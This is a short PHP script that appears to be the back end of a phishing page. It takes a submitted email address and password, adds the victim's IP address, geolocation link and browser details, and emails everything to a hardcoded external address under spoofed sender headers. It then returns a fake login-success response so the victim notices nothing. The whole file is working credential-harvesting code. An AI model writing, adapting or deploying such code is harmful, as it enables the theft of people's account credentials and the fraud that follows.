<?php
error_reporting(0);
$Receive_email = 'dougmalcom@yandex.com';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
if($email != "" || $password != "" ){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message = "------------------------------------\n";
	$message .= "em           : ".$email."\n";
	$message .= "pr              : ".$password."\n";
	$message .= "------------------------------------\n";
	$message .= $ip."\n";
	$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "UserAg : ".$useragent."\n";
	$message .= "-------------------------\n";
	$send = $Receive_email;
	$subject = "RES : $ip";
	$headers = "From: webmaster@mail.com\r\n";
	$headers .= "Reply-To: webmaster@mail.com\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
	$headers .= "X-Priority: 1\r\n";
	$headers .= "X-Mailer: PHP/" . phpversion();
	mail($send, $subject, $message, $headers); 
	$signal ='ok';
	$msg ='InValid Credentials';
}
else{
	$signal='bad';
	$msg='Please fill in all the fields.';
}
echo json_encode(["login"=> true]);
?>